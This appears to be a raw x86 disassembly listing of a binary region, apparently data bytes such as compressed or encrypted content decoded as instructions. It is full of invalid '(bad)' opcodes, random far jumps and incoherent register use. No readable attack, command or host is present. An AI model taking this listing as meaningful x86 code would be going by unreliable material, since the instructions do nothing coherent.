  42c744:	daa    
  42c745:	(bad)  
  42c746:	in     eax,dx
  42c747:	xor    DWORD PTR [ebx+ebx*4],esp
  42c74a:	(bad)  [ebx+0x1d49923d]
  42c750:	cmp    DWORD PTR [edx-0x20],edi
  42c753:	pop    ss
  42c754:	cmc    
  42c755:	shl    BYTE PTR [edx+0x5f285995],1
  42c75b:	jb     0x42c79d
  42c75d:	jno    0x42c729
  42c75f:	std    
  42c760:	adc    DWORD PTR [ebx-0x4a3a3b16],ecx
  42c766:	ret    
  42c767:	mov    eax,0xf8d1a376
  42c76c:	dec    esp
  42c76d:	mov    dl,0xac
  42c76f:	shl    DWORD PTR [ecx-0x7f],1
  42c772:	or     DWORD PTR [ecx-0x22],edx
  42c775:	xchg   BYTE PTR [edx-0x441ce4bc],dl
  42c77b:	test   eax,0xb740971d
  42c780:	fsub   st,st(0)
  42c782:	sub    eax,0xec9a3506
  42c787:	mov    ch,0x41
  42c789:	xor    eax,0x3b04ee4a
  42c78e:	or     DWORD PTR [edx],edx
  42c790:	or     DWORD PTR [edi-0x159dd815],ebx
  42c796:	dec    ebp
  42c797:	jp     0x42c763
  42c799:	pop    ebx
  42c79a:	mov    edi,DWORD PTR [eax-0x311e8255]
  42c7a0:	mov    edx,0x2d9cf091
  42c7a5:	pop    es
  42c7a6:	and    dh,bh
  42c7a8:	outs   dx,DWORD PTR ds:[esi]
  42c7a9:	leave  
  42c7aa:	ror    DWORD PTR [edi],1
  42c7ac:	pop    ebp
  42c7ad:	mov    dh,0xf3
  42c7af:	(bad)  
  42c7b1:	add    esi,esp
  42c7b3:	mov    ch,BYTE PTR [ebx-0x259788c1]
  42c7b9:	test   BYTE PTR [eax],ch
  42c7bb:	call   0x2e98:0x33f25dde
  42c7c2:	fwait
  42c7c3:	xchg   esi,eax
  42c7c4:	mov    al,ds:0x9db46a50
  42c7c9:	xlat   BYTE PTR ds:[ebx]
  42c7ca:	adc    DWORD PTR [ecx+0x16ef390f],ebx
  42c7d0:	ja     0x42c80e
  42c7d2:	xchg   edi,eax
  42c7d3:	mov    esi,0x11343ee9
  42c7d8:	push   0x23d27e8
  42c7dd:	inc    edi
  42c7de:	outs   dx,BYTE PTR ds:[esi]
  42c7df:	retf   0x42e1
  42c7e2:	std    
  42c7e3:	mov    eax,ds:0xb3cfb2fd
  42c7e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c7e9:	dec    edx
  42c7ea:	push   edx
  42c7eb:	xor    al,0x7e
  42c7ed:	inc    DWORD PTR [eax]
	...
  42c853:	add    BYTE PTR [eax],al
  42c855:	add    BYTE PTR [eax],bh
  42c857:	mov    DWORD PTR [edx-0x6b],ebp
  42c85a:	sti    
  42c85b:	idiv   edi
  42c85d:	lods   eax,DWORD PTR ds:[esi]
  42c85e:	pop    ebp
  42c85f:	sbb    eax,0xcd7ba40e
  42c864:	and    esp,ebp
  42c866:	fld    QWORD PTR [bx+di]
  42c869:	add    BYTE PTR [eax],al
  42c86b:	add    DWORD PTR [eax],eax
  42c86d:	add    BYTE PTR [edx+0x1966682f],ah
  42c873:	and    ch,dh
  42c875:	sub    al,ch
  42c877:	aam    0x52
  42c879:	pop    ss
  42c87a:	cdq    
  42c87b:	aad    0x74
  42c87d:	outs   dx,BYTE PTR ds:[esi]
  42c87e:	xchg   ebx,eax
  42c87f:	leave  
  42c880:	sbb    eax,edi
  42c882:	xor    DWORD PTR [ebx-0x7e],0xc2c17933
  42c889:	imul   edi
  42c88b:	xchg   esp,eax
  42c88c:	and    DWORD PTR [eax+0x7e],ebp
  42c88f:	pcmpgtd mm1,QWORD PTR [esp+ecx*1+0x77]
  42c894:	rcl    DWORD PTR [edx+0x41],cl
  42c897:	pop    edx
  42c898:	(bad)  
  42c899:	jmp    0x3a32:0xe6afe133
  42c8a0:	jle    0x42c902
  42c8a2:	es popf 
  42c8a4:	jbe    0x42c847
  42c8a6:	or     DWORD PTR [edi],ecx
  42c8a8:	aad    0x7e
  42c8aa:	inc    edi
  42c8ab:	loop   0x42c904
  42c8ad:	enter  0x6d48,0x0
  42c8b1:	mov    bh,ch
  42c8b3:	dec    ebp
  42c8b5:	leave  
  42c8b6:	sub    DWORD PTR [edi+edx*8],0xffffffa2
  42c8ba:	sub    BYTE PTR [ecx+0x24],al
  42c8bd:	pop    esp
  42c8be:	jno    0x42c920
  42c8c0:	retf   
  42c8c1:	pusha  
  42c8c2:	fdiv   QWORD PTR [esi]
  42c8c4:	mov    eax,0x39a1d4fb
  42c8c9:	jns    0x42c8ea
  42c8cb:	out    0x48,eax
  42c8cd:	leave  
  42c8ce:	sbb    edx,DWORD PTR [ebx+0xa8fbb4e]
  42c8d4:	xor    dl,BYTE PTR [esi]
  42c8d6:	xor    ebp,ecx
  42c8d8:	sub    eax,0x6407b5cc
  42c8dd:	fwait
  42c8de:	lods   eax,DWORD PTR ds:[esi]
  42c8df:	je     0x42c8af
  42c8e1:	push   esi
  42c8e2:	mov    DWORD PTR [esi+0x339935c1],ecx
  42c8e8:	cli    
  42c8e9:	inc    eax
  42c8ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c8eb:	xchg   esp,eax
  42c8ec:	cmp    bh,cl
  42c8ee:	sbb    al,0x33
  42c8f0:	rcl    DWORD PTR [esi-0x54],cl
  42c8f3:	aaa    
  42c8f4:	mov    ebp,0x37721f1a
  42c8f9:	add    al,0x63
  42c8fb:	outs   dx,DWORD PTR ds:[esi]
  42c8fc:	xchg   ecx,eax
  42c8fd:	movzx  ecx,WORD PTR [eax-0x78]
  42c901:	adc    cl,bh
  42c903:	sub    esp,0xffffff8e
  42c906:	scas   eax,DWORD PTR es:[edi]
  42c907:	inc    ebx
  42c908:	dec    eax
  42c90a:	(bad)  
  42c90b:	int3   
  42c90c:	popa   
  42c90d:	(bad)
  42c910:	push   ss
  42c911:	(bad)  
  42c913:	push   es
  42c914:	mov    esp,0x8d5f7212
  42c919:	lds    ebx,FWORD PTR ds:0xebcee13b
  42c91f:	mov    ds,WORD PTR [ebp+0x6b]
  42c922:	pop    eax
  42c923:	test   eax,0xba370f98
  42c928:	aas    
  42c929:	mov    esi,0x63d6006
  42c92e:	sbb    DWORD PTR [edi+0x1cb9b3f9],eax
  42c934:	add    dh,cl
  42c936:	jle    0x42c99f
  42c938:	sub    BYTE PTR [ecx],dh
  42c93a:	lahf   
  42c93b:	mov    al,ds:0x2af23550
  42c940:	pop    ds
  42c941:	xor    eax,0xb5dcca32
  42c946:	aas    
  42c947:	pop    esp
  42c948:	std    
  42c949:	or     esp,ebp
  42c94b:	push   esi
  42c94c:	jl     0x42c9a7
  42c94e:	(bad)  
  42c94f:	fiadd  DWORD PTR [edx]
  42c951:	in     al,dx
  42c952:	arpl   di,bp
  42c954:	sti    
  42c955:	inc    ecx
  42c956:	in     eax,0x83
  42c958:	inc    ebp
  42c959:	test   BYTE PTR [edi+edi*8],al
  42c95c:	dec    ecx
  42c95d:	les    edx,FWORD PTR [ebp-0x1a388674]
  42c963:	stc    
  42c964:	je     0x42c99f
  42c966:	mov    esp,0xa28c8c9f
  42c96b:	and    DWORD PTR [edx],edi
  42c96d:	mov    cl,0x0
	...
  42c9d3:	add    BYTE PTR [eax],al
  42c9d5:	add    BYTE PTR [eax],dl
  42c9d7:	sbb    ecx,ecx
  42c9d9:	jmp    0xfb73c5a9
  42c9de:	(bad)  
  42c9df:	scas   eax,DWORD PTR es:[edi]
  42c9e0:	inc    edi
  42c9e1:	call   0x324bf39e
  42c9e6:	fiadd  WORD PTR [bx+di]
  42c9e9:	add    BYTE PTR [eax],al
  42c9eb:	add    DWORD PTR [eax],eax
  42c9ed:	add    dh,dl
  42c9ef:	fistp  DWORD PTR [edx-0x3a763af]
  42c9f5:	cdq    
  42c9f6:	not    DWORD PTR [ebp+0x37]
  42c9f9:	mov    esp,0x8f0074ba
  42c9fe:	pop    ss
  42c9ff:	dec    ebx
  42ca00:	pop    ss
  42ca01:	ror    DWORD PTR [edx-0x2b35ede5],cl
  42ca07:	fsub   QWORD PTR [edi]
  42ca09:	sbb    DWORD PTR [edx+0x2ee68a8],esp
  42ca0f:	mov    ch,0x6c
  42ca11:	sub    al,BYTE PTR [ebx]
  42ca13:	outs   dx,BYTE PTR ds:[esi]
  42ca14:	xor    eax,0x4fc215df
  42ca19:	xchg   edx,eax
  42ca1a:	(bad)  
  42ca1b:	ins    BYTE PTR es:[edi],dx
  42ca1c:	mov    gs,WORD PTR [ebp+0x1]
  42ca1f:	or     dh,BYTE PTR [edx-0x5b]
  42ca22:	mov    eax,ds:0x13a3073a
  42ca27:	lods   al,BYTE PTR ds:[esi]
  42ca28:	into   
  42ca29:	call   0x8892d16a
  42ca2e:	dec    edi
  42ca2f:	xchg   edi,eax
  42ca30:	bound  esp,QWORD PTR [edi+esi*1]
  42ca33:	add    DWORD PTR [edx],0xb
  42ca36:	sahf   
  42ca37:	sub    edx,DWORD PTR [edx]
  42ca39:	out    dx,al
  42ca3a:	adc    edi,DWORD PTR [eax-0x6e]
  42ca3d:	ds pop esp
  42ca3f:	in     eax,0x3b
  42ca41:	ret    
  42ca42:	cmp    BYTE PTR [eax-0x32],0x5f
  42ca46:	mov    edx,0xd98d4ce6
  42ca4b:	call   0x925a:0xc73ef395
  42ca52:	jge    0x42ca21
  42ca54:	xchg   esi,eax
  42ca55:	pop    ds
  42ca56:	dec    edx
  42ca57:	xor    cl,BYTE PTR [eax]
  42ca59:	mov    dl,0x21
  42ca5b:	xor    edi,esp
  42ca5d:	or     BYTE PTR [edi+0x1e],ch
  42ca60:	sub    BYTE PTR [eax],dh
  42ca62:	adc    DWORD PTR [ebx+edx*4+0x9],ebp
  42ca66:	cs push es
  42ca68:	cld    
  42ca69:	mov    al,0xc9
  42ca6b:	xchg   DWORD PTR [ebp+eiz*4+0x3e],eax
  42ca6f:	pop    ecx
  42ca70:	int    0x8e
  42ca72:	int    0x1d
  42ca74:	mov    edx,DWORD PTR [ebp-0x73cdef98]
  42ca7a:	call   0x4cae0cdd
  42ca7f:	out    dx,eax
  42ca80:	lods   eax,DWORD PTR ds:[esi]
  42ca81:	inc    esi
  42ca82:	bound  eax,QWORD PTR [edx-0x2c]
  42ca85:	mov    edx,0x6cf79a31
  42ca8a:	popf   
  42ca8b:	test   BYTE PTR [ecx],0x1a
  42ca8e:	cmp    ah,BYTE PTR [ebx+0x598072ed]
  42ca94:	lods   eax,DWORD PTR ds:[esi]
  42ca95:	mov    ds:0xac347425,eax
  42ca9a:	ins    DWORD PTR es:[edi],dx
  42ca9b:	loopne 0x42ca5a
  42ca9d:	lds    edi,FWORD PTR [ebx-0x55]
  42caa0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42caa1:	jmp    0xdf0a:0x7798bc09
  42caa8:	pop    esp
  42caa9:	push   eax
  42caaa:	lock clc 
  42caac:	dec    eax
  42caad:	imul   DWORD PTR [ebp-0x74]
  42cab0:	mov    dh,0x4d
  42cab2:	(bad)  
  42cab3:	out    0x30,eax
  42cab5:	(bad)  
  42cab6:	(bad)  
  42cab7:	jns    0x42ca97
  42cab9:	pop    ds
  42caba:	sahf   
  42cabb:	outs   dx,DWORD PTR ds:[esi]
  42cabc:	or     al,0x18
  42cabe:	adc    DWORD PTR [ebx],ecx
  42cac0:	push   ss
  42cac1:	std    
  42cac2:	call   0x99c5:0xaf9488dd
  42cac9:	out    dx,eax
  42caca:	outs   dx,DWORD PTR ds:[esi]
  42cacb:	jmp    0xc5b0:0xa268b5f8
  42cad2:	or     eax,0x671805fc
  42cad7:	aas    
  42cad8:	push   esi
  42cad9:	push   ecx
  42cada:	(bad)  
  42cadb:	mov    ecx,0x6f694cb8
  42cae0:	fcmovb st,st(6)
  42cae2:	xchg   DWORD PTR [edx],edx
  42cae4:	mov    eax,0x295d73b3
  42cae9:	jl     0x42cb3e
  42caeb:	or     DWORD PTR [esi+0xe7],0x0
	...
  42cb56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42cb57:	fimul  DWORD PTR [eax-0x10ac02bf]
  42cb5d:	(bad)  
  42cb5e:	fadd   QWORD PTR [ebp-0x5b139140]
  42cb64:	stos   BYTE PTR es:[edi],al
  42cb65:	pop    edx
  42cb66:	fild   WORD PTR [bx+di]
  42cb69:	add    BYTE PTR [eax],al
  42cb6b:	add    DWORD PTR [eax],eax
  42cb6d:	add    BYTE PTR [edx+edx*2+0x7b],dh
  42cb71:	imul   ebp,DWORD PTR [eax-0x66bd863],0x78
  42cb78:	mov    ebx,0x298b6668
  42cb7d:	sbb    ecx,DWORD PTR [edx-0x2e]
  42cb80:	retf   0xef02
  42cb83:	mov    WORD PTR [ebx],ss
  42cb85:	push   0x7d
  42cb87:	popf   
  42cb88:	cmp    al,BYTE PTR [ecx-0x12]
  42cb8b:	xchg   edi,eax
  42cb8c:	jnp    0x42cbd6
  42cb8e:	push   0x97fe85a5
  42cb93:	out    0xd5,al
  42cb95:	pop    esi
  42cb96:	adc    DWORD PTR [edi-0x194020ac],ebp
  42cb9c:	into   
  42cb9d:	jmp    DWORD PTR [ecx+0x42a49c1b]
  42cba3:	push   es
  42cba4:	adc    al,BYTE PTR [ebp+esi*8+0x73]
  42cba8:	outs   dx,DWORD PTR ds:[esi]
  42cba9:	pop    edx
  42cbaa:	shr    BYTE PTR [ebp-0x35109ae0],cl
  42cbb0:	push   cs
  42cbb1:	or     al,0x42
  42cbb3:	scas   eax,DWORD PTR es:[edi]
  42cbb4:	fwait
  42cbb5:	xor    BYTE PTR [edx],0xe8
  42cbb8:	in     al,0xb8
  42cbba:	jle    0x42cbbc
  42cbbc:	jns    0x42cbf6
  42cbbe:	mov    edx,0xebdec43f
  42cbc3:	icebp  
  42cbc4:	imul   BYTE PTR [esi+0x5b]
  42cbc7:	daa    
  42cbc8:	mov    al,0x2
  42cbca:	ret    
  42cbcb:	cmp    BYTE PTR [ebp+0x46],dl
  42cbce:	jnp    0x42cbf3
  42cbd0:	and    al,0xa6
  42cbd2:	push   eax
  42cbd3:	jo     0x42cb89
  42cbd5:	adc    eax,0xdae6bea6
  42cbda:	mov    gs,WORD PTR [edi-0x79]
  42cbdd:	lock cdq 
  42cbdf:	inc    edx
  42cbe0:	int    0x7a
  42cbe2:	inc    esi
  42cbe3:	or     ah,BYTE PTR [edi]
  42cbe5:	xchg   edx,eax
  42cbe6:	(bad)  
  42cbe7:	sub    al,0xa6
  42cbe9:	dec    edi
  42cbea:	int    0x8e
  42cbec:	pop    es
  42cbed:	test   eax,0x5adc3324
  42cbf2:	test   DWORD PTR [ebx],edx
  42cbf4:	fidivr DWORD PTR ds:0xd35d72d1
  42cbfa:	ins    BYTE PTR es:[edi],dx
  42cbfb:	push   0x12
  42cbfd:	aaa    
  42cbfe:	je     0x42cb8d
  42cc00:	xchg   DWORD PTR [bp+0x5a],edx
  42cc04:	test   ebx,ebx
  42cc06:	mov    al,0xb1
  42cc08:	bound  esi,QWORD PTR [edi]
  42cc0a:	out    dx,eax
  42cc0b:	mov    ebp,0x9b8392be
  42cc10:	or     DWORD PTR [esi+0x3a9c1456],ecx
  42cc16:	repnz push DWORD PTR [edi+ebx*2+0x49]
  42cc1b:	cs xor eax,0x31e2b597
  42cc21:	sar    DWORD PTR [eax],0x22
  42cc24:	pop    esi
  42cc25:	test   DWORD PTR [ecx+0x3a],edi
  42cc28:	ins    DWORD PTR es:[edi],dx
  42cc29:	ret    
  42cc2a:	pop    edi
  42cc2b:	jle    0x42cbe8
  42cc2d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42cc2e:	mov    ah,0x5f
  42cc30:	sbb    ecx,DWORD PTR [edx+0x58]
  42cc33:	inc    edx
  42cc34:	xchg   ecx,eax
  42cc35:	sub    cl,BYTE PTR [ecx+0x6]
  42cc38:	in     al,0x92
  42cc3a:	mov    dh,0x9
  42cc3c:	in     eax,dx
  42cc3d:	test   DWORD PTR [ecx-0x7b0109d4],0x81863c32
  42cc47:	and    bl,ch
  42cc49:	(bad)  
  42cc4a:	scas   al,BYTE PTR es:[edi]
  42cc4b:	jle    0x42cc5d
  42cc4d:	dec    edi
  42cc4e:	adc    ah,BYTE PTR [ebp+0x6f]
  42cc51:	sar    ecx,cl
  42cc53:	or     DWORD PTR [edi],esi
  42cc55:	mov    bl,0x12
  42cc57:	pop    edx
  42cc58:	or     edi,DWORD PTR [edx]
  42cc5a:	push   eax
  42cc5b:	xchg   ebp,eax
  42cc5c:	mov    ebx,0xde75ce43
  42cc61:	lock xchg edx,eax
  42cc63:	or     eax,0x911cacc9
  42cc68:	ins    BYTE PTR es:[edi],dx
  42cc69:	ss cmp dl,ah
  42cc6c:	fldcw  WORD PTR [eax]
	...
  42ccd6:	jg     0x42ccda
  42ccd8:	mov    esp,DWORD PTR [edi+edi*8-0x13]
  42ccdc:	call   FWORD PTR [ebx]
  42ccde:	fisttp WORD PTR [ebp+0x1]
  42cce1:	or     eax,0x2b5639b0
  42cce6:	addr16 loopne 0x42ccea
  42cce9:	add    BYTE PTR [eax],al
  42cceb:	add    DWORD PTR [eax],eax
  42cced:	add    BYTE PTR [ebx],ah
  42ccef:	test   al,0x3c
  42ccf1:	stos   DWORD PTR es:[edi],eax
  42ccf2:	dec    ecx
  42ccf3:	pop    ds
  42ccf4:	test   BYTE PTR [esi+0x5d],0xac
  42ccf8:	cmp    al,0xde
  42ccfa:	xor    BYTE PTR es:[esi-0x75],dh
  42ccfe:	dec    edx
  42ccff:	je     0x42cd7b
  42cd01:	jecxz  0x42ccad
  42cd03:	push   0x8cec3ff2
  42cd08:	js     0x42cd27
  42cd0a:	lods   eax,DWORD PTR ds:[esi]
  42cd0b:	cmp    ch,BYTE PTR [edi-0x3438f74a]
  42cd11:	xchg   ebx,eax
  42cd12:	hlt    
  42cd13:	xchg   ecx,eax
  42cd14:	push   ds
  42cd15:	fimul  WORD PTR [edi+0x4b8a17e7]
  42cd1b:	adc    al,0x8e
  42cd1d:	mov    al,ds:0x343d0d6c
  42cd22:	jmp    0xf77d:0xa40bf3c3
  42cd29:	push   es
  42cd2a:	(bad)  
  42cd2b:	pop    esp
  42cd2c:	sub    bl,dh
  42cd2e:	inc    esi
  42cd2f:	cmp    ecx,eax
  42cd31:	std    
  42cd32:	pop    es
  42cd33:	je     0x42cd38
  42cd35:	add    al,0x51
  42cd37:	push   esi
  42cd38:	call   DWORD PTR [edx-0xa]
  42cd3b:	xchg   DWORD PTR [esp+edx*2-0x18],esp
  42cd3f:	sub    edi,edx
  42cd41:	jl     0x42cd86
  42cd43:	in     eax,dx
  42cd44:	xchg   ebx,eax
  42cd45:	mov    cs,WORD PTR [edi]
  42cd47:	adc    eax,0x2f638f55
  42cd4c:	add    DWORD PTR [ebp-0x79],0xb82b6257
  42cd53:	iret   
  42cd54:	jl     0x42cd4c
  42cd56:	mov    bh,0x33
  42cd58:	loop   0x42ccf6
  42cd5a:	mov    ecx,0x249deef4
  42cd5f:	adc    eax,0xecbb1ccd
  42cd64:	call   0x2a5f:0xf1f41a30
  42cd6b:	sti    
  42cd6c:	std    
  42cd6d:	(bad)  
  42cd6e:	xchg   ecx,eax
  42cd6f:	or     DWORD PTR [ebx-0x934ab75],edx
  42cd75:	mov    DWORD PTR [ecx],esi
  42cd77:	popa   
  42cd78:	sahf   
  42cd79:	rcl    DWORD PTR [eax+0x76687410],1
  42cd7f:	jmp    0x42cd09
  42cd81:	ret    0x18fd
  42cd84:	loope  0x42cd9c
  42cd86:	fbstp  TBYTE PTR ds:[edi*2-0x4ddd4298]
  42cd8e:	test   DWORD PTR [esi-0x63c11d6a],ebp
  42cd94:	xchg   DWORD PTR [eax+ebp*8-0x3d],ebp
  42cd98:	and    eax,0x866ccfc6
  42cd9d:	jae    0x42cd35
  42cd9f:	mov    ds:0x10bbff5a,eax
  42cda4:	mov    BYTE PTR [ecx+0x77],al
  42cda7:	sub    BYTE PTR [edx],bh
  42cda9:	mov    cl,0xf7
  42cdab:	and    ah,dl
  42cdad:	lock xchg ecx,eax
  42cdaf:	mov    dh,0xdc
  42cdb1:	mov    ah,0xef
  42cdb3:	ss enter 0x404c,0x71
  42cdb8:	add    al,0xec
  42cdba:	xchg   BYTE PTR [ebx+0x48c8c655],bl
  42cdc0:	imul   ebp,ebp,0xdc002d09
  42cdc6:	ins    DWORD PTR es:[edi],dx
  42cdc7:	jl     0x42cdef
  42cdc9:	dec    ecx
  42cdca:	ja     0x42ce04
  42cdcc:	(bad)  
  42cdce:	jnp    0x42cd88
  42cdd0:	sub    BYTE PTR [ebp+0x61643f8f],dl
  42cdd6:	stc    
  42cdd7:	add    bl,bh
  42cdd9:	(bad)  
  42cddb:	inc    ecx
  42cddc:	sub    eax,0x7c3142ee
  42cde1:	in     eax,dx
  42cde2:	sahf   
  42cde3:	sar    DWORD PTR [ebp+edx*4-0x74],cl
  42cde7:	sbb    eax,0xc76f443b
  42cdec:	pop    ebp
  42cded:	call   0x0:0x0
	...
  42ce54:	add    BYTE PTR [eax],al
  42ce56:	sbb    DWORD PTR [ecx-0x20017802],esp
  42ce5c:	jns    0x42ce1d
  42ce5e:	xchg   BYTE PTR [esi],dh
  42ce60:	xchg   esi,eax
  42ce61:	mov    ch,0x5
  42ce63:	cmp    DWORD PTR [ebx+0x44],edi
  42ce66:	addr16 loope 0x42ce6a
  42ce69:	add    BYTE PTR [eax],al
  42ce6b:	add    DWORD PTR [eax],eax
  42ce6d:	add    bh,ah
  42ce6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ce70:	fisubr WORD PTR [edi+0x5d]
  42ce73:	int    0x95
  42ce75:	mov    cl,0xef
  42ce77:	jge    0x42ced0
  42ce79:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ce7a:	xchg   ecx,eax
  42ce7b:	xor    DWORD PTR [ebx+0x4],0x9ece1c21
  42ce82:	sbb    bl,dh
  42ce84:	outs   dx,DWORD PTR ds:[esi]
  42ce85:	inc    ecx
  42ce86:	sbb    al,0xb8
  42ce88:	ins    DWORD PTR es:[edi],dx
  42ce89:	sti    
  42ce8a:	retf   
  42ce8b:	fild   DWORD PTR [eax+0x120247f5]
  42ce91:	adc    DWORD PTR [edi+0x36],esp
  42ce94:	aaa    
  42ce95:	cwde   
  42ce96:	pusha  
  42ce97:	sub    al,0x4b
  42ce99:	popf   
  42ce9a:	cmp    al,0xc7
  42ce9c:	jmp    0x42cebc
  42ce9e:	sbb    BYTE PTR [eax-0x21ea0122],ah
  42cea4:	mov    bh,0x6b
  42cea6:	jge    0x42ced2
  42cea8:	and    al,0x11
  42ceaa:	jl     0x42cecf
  42ceac:	or     BYTE PTR [ebp-0x5a1877c6],0x31
  42ceb3:	xchg   ecx,eax
  42ceb4:	push   ds
  42ceb5:	add    ebp,DWORD PTR [edi]
  42ceb7:	fucomp st(5)
  42ceb9:	push   0x343e391f
  42cebe:	pop    esp
  42cebf:	repnz ss and al,0x37
  42cec3:	pusha  
  42cec4:	pop    ebx
  42cec5:	jae    0x42ced0
  42cec7:	xchg   ch,dh
  42cec9:	pop    ss
  42ceca:	data16 aad 0x24
  42cecd:	icebp  
  42cece:	sub    ch,BYTE PTR [esi+0x5b]
  42ced1:	push   ds
  42ced2:	lods   al,BYTE PTR ds:[esi]
  42ced3:	cwde   
  42ced4:	dec    esp
  42ced5:	mov    al,0x21
  42ced7:	mov    WORD PTR [edx-0x124af865],?
  42cedd:	js     0x42cef9
  42cedf:	sub    esp,eax
  42cee1:	shr    DWORD PTR [ebp-0x1311e84f],0x9e
  42cee8:	(bad)  
  42cee9:	(bad)  
  42ceea:	jnp    0x42cea9
  42ceec:	dec    esp
  42ceed:	mov    dl,0x1d
  42ceef:	jl     0x42cf2c
  42cef1:	enter  0x6819,0x96
  42cef5:	scas   al,BYTE PTR es:[edi]
  42cef6:	xor    DWORD PTR ds:0x902d0f1f,esp
  42cefc:	cmp    bh,dh
  42cefe:	test   eax,0xcd773ba8
  42cf03:	mov    ah,0x15
  42cf05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42cf06:	shl    esi,cl
  42cf08:	loopne 0x42cf5e
  42cf0a:	fld    DWORD PTR ds:0x5109e4de
  42cf10:	imul   BYTE PTR [esi+0x55616222]
  42cf16:	and    ah,BYTE PTR [eax-0x6de8e76]
  42cf1c:	sbb    cl,ah
  42cf1e:	mov    bh,0x6c
  42cf20:	add    DWORD PTR [eax-0x2f1726c0],esp
  42cf26:	sub    eax,DWORD PTR [ecx+ecx*2+0xa]
  42cf2a:	fsubr  QWORD PTR [ecx-0x62c2ef46]
  42cf30:	push   0x7a
  42cf32:	add    eax,0x4435698f
  42cf37:	mov    dh,0xcc
  42cf39:	or     eax,0x5a6b25f9
  42cf3e:	xchg   edx,eax
  42cf3f:	bound  ebx,QWORD PTR [edi+eiz*8-0x4e]
  42cf43:	dec    esp
  42cf44:	or     dl,BYTE PTR ds:0x1e7c6ee6
  42cf4a:	mov    WORD PTR [esi+0x2b43e344],?
  42cf50:	loop   0x42cee9
  42cf52:	gs pop edi
  42cf54:	aas    
  42cf55:	mov    ds,WORD PTR [edx+0x28]
  42cf58:	mov    edi,0x694d82f
  42cf5d:	mov    DWORD PTR [ecx-0x280d18a4],ebp
  42cf63:	sub    dl,BYTE PTR [edi]
  42cf65:	push   esi
  42cf66:	or     al,0x90
  42cf68:	shl    DWORD PTR [esi+0x2725d4ef],0x0
	...
  42cfd3:	add    BYTE PTR [eax],al
  42cfd5:	add    BYTE PTR [ebx+0x3d],dh
  42cfd8:	fadd   st,st(1)
  42cfda:	fsubrp st(5),st
  42cfdc:	jnp    0x42cf9d
  42cfde:	or     al,BYTE PTR [esi]
  42cfe0:	cld    
  42cfe1:	les    ebx,FWORD PTR [edi+0x67893519]
  42cfe7:	loop   0x42cfea
  42cfe9:	add    BYTE PTR [eax],al
  42cfeb:	add    DWORD PTR [eax],eax
  42cfed:	add    BYTE PTR [ebx],bh
  42cfef:	cs scas eax,DWORD PTR es:[edi]
  42cff1:	dec    ebx
  42cff2:	scas   al,BYTE PTR es:[edi]
  42cff3:	jg     0x42d048
  42cff5:	loope  0x42d025
  42cff7:	fild   DWORD PTR [ebp-0x315b75a6]
  42cffd:	mov    dl,0x7
  42cfff:	and    BYTE PTR [ecx+0x76],bh
  42d002:	mov    ds:0x863f3e49,eax
  42d007:	imul   ecx,DWORD PTR [ebp-0x2d],0xba824fc
  42d00e:	xchg   eax,ebx
  42d010:	pop    ebx
  42d011:	hlt    
  42d012:	mov    esi,0x8824ecb5
  42d017:	xor    eax,0xb7de3bad
  42d01c:	clc    
  42d01d:	stos   DWORD PTR es:[edi],eax
  42d01e:	sahf   
  42d01f:	pop    ds
  42d020:	sub    dh,dh
  42d022:	int    0x70
  42d024:	pop    esp
  42d025:	pop    esp
  42d026:	shl    BYTE PTR [ecx+0x72ba8a85],cl
  42d02c:	cmc    
  42d02d:	dec    esi
  42d02e:	sbb    al,BYTE PTR [ebp+ebp*1+0x64887320]
  42d035:	rcl    edi,0x5e
  42d038:	arpl   si,bp
  42d03a:	mov    ds,WORD PTR ds:0x6ef7d788
  42d040:	ss inc esi
  42d042:	stc    
  42d043:	jle    0x42d00e
  42d045:	xor    BYTE PTR [edx],ch
  42d047:	xchg   esi,eax
  42d048:	(bad)  
  42d049:	out    dx,eax
  42d04a:	nop
  42d04b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d04c:	or     bh,cl
  42d04e:	jecxz  0x42d069
  42d050:	and    DWORD PTR [esi+0x4cd76c39],0xffffffb3
  42d057:	mul    DWORD PTR [eax-0x683efe08]
  42d05d:	jbe    0x42d0bf
  42d05f:	xor    bh,BYTE PTR [esi]
  42d061:	xor    BYTE PTR [edi-0x668d928],ch
  42d067:	xchg   ebx,eax
  42d068:	or     esi,ebx
  42d06a:	fbstp  TBYTE PTR ds:0x4cab33c4
  42d070:	cvtdq2ps xmm1,xmm2
  42d073:	dec    esp
  42d074:	cmp    DWORD PTR es:[ebx+ebp*4-0x36],edx
  42d079:	xor    eax,0xd81778b0
  42d07e:	jmp    0x42d077
  42d080:	fnsave [ebp+edi*2-0x53]
  42d084:	jle    0x42d0d1
  42d086:	pop    ebp
  42d087:	data16 xlat BYTE PTR ds:[ebx]
  42d089:	fistp  QWORD PTR [ebp+0x49]
  42d08c:	mov    BYTE PTR [ecx+0x1e],ah
  42d08f:	inc    esp
  42d090:	sar    cl,1
  42d092:	les    esp,FWORD PTR [ecx]
  42d094:	jge    0x42d0f3
  42d096:	ret    
  42d097:	repnz add DWORD PTR [eax-0x58f9f085],0xffffffae
  42d09f:	cli    
  42d0a0:	mov    ch,0x5a
  42d0a2:	pop    ss
  42d0a3:	cmp    bl,BYTE PTR [edi+edi*8+0x3b]
  42d0a7:	mov    ds:0x9eceb1ae,eax
  42d0ac:	test   DWORD PTR [ecx+esi*2],ebx
  42d0af:	ja     0x42d04c
  42d0b1:	mov    WORD PTR [ebx+0x23],cs
  42d0b4:	pop    ds
  42d0b5:	cli    
  42d0b6:	cmp    ecx,DWORD PTR [ecx+0x7fd60dfc]
  42d0bc:	or     bl,ch
  42d0be:	inc    edx
  42d0bf:	inc    esp
  42d0c0:	jnp    0x42d0cc
  42d0c2:	std    
  42d0c3:	inc    esp
  42d0c4:	xchg   ebp,eax
  42d0c5:	sahf   
  42d0c6:	and    esi,DWORD PTR [ecx-0x72]
  42d0c9:	xor    DWORD PTR [si-0x1e0f],edi
  42d0ce:	push   edi
  42d0cf:	mov    cl,0x31
  42d0d1:	aam    0x5
  42d0d3:	and    bh,BYTE PTR [edi]
  42d0d5:	push   ss
  42d0d6:	rol    BYTE PTR [ecx+0xb],1
